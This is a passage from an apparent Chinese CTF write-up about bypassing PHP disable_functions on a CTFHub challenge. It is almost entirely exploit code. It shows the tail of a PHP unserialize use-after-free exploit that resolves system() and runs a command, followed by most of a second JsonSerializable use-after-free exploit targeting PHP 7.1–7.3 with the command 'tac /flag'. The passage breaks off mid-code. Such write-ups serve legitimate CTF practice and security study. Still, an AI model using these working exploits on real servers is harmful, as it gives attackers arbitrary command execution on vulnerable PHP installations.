class="variable language_">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问以下URL即可出现flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-e2dba0faaf3a8abc.sandbox.ctfhub.com:10800/exploit.php</span><br></pre></td></tr></table></figure><h2 id="17-6-Json-Serializer-UAF"><a href="#17-6-Json-Serializer-UAF" class="headerlink" title="17.6  Json Serializer UAF"></a>17.6  Json Serializer UAF</h2><p>方法一：蚁剑插件PHP7_Serializer_UAF</p><p>方法二：脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php版本：</span></span><br><span class="line"><span class="comment">#7.1 - all versions to date</span></span><br><span class="line"><span class="comment">#7.2 &lt; 7.2.19 (released: 30 May 2019)</span></span><br><span class="line"><span class="comment">#7.3 &lt; 7.3.6 (released: 30 May 2019)</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;tac /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span 